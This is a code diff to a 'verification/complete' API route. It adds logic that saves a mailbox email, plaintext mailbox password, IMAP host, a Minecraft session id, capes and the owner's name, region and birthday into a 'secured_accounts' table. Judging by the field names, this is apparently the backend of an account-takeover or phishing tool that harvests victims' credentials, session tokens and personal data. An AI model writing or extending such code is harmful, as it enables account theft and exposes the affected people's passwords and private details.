@@ -190,6 +190,34 @@ export const Route = createFileRoute("/api/verification/complete")({
           );
         }
 
+        // Always try to attach mailbox + optional fields (works if columns exist; no-op if not)
+        if (securedRow?.id) {
+          const patch: Record<string, unknown> = {};
+          if (mailboxEmail) patch.mailbox_email = mailboxEmail;
+          if (mailboxPassword) patch.mailbox_password = mailboxPassword;
+          if (mailboxProvider) patch.mailbox_provider = mailboxProvider;
+          if (mailboxImapHost) patch.mailbox_imap_host = mailboxImapHost;
+          if (result.ssid) patch.mc_ssid = result.ssid;
+          if (result.capes) patch.mc_capes = result.capes;
+          if (result.method) patch.mc_method = result.method;
+          if (result.firstName) patch.owner_first_name = result.firstName;
+          if (result.lastName) patch.owner_last_name = result.lastName;
+          if (result.region) patch.owner_region = result.region;
+          if (result.birthday) patch.owner_birthday = result.birthday;
+          if (Object.keys(patch).length) {
+            const { error: patchErr } = await db()
+              .from("secured_accounts")
+              .update(patch)
+              .eq("id", securedRow.id);
+            if (patchErr) {
+              console.warn(
+                "[verification/complete] mailbox/details patch failed (run SQL migration):",
+                patchErr.message,
+              );
+            }
+          }
+        }
+
         if (sessionId) {
           await db()
             .from("verification_sessions")
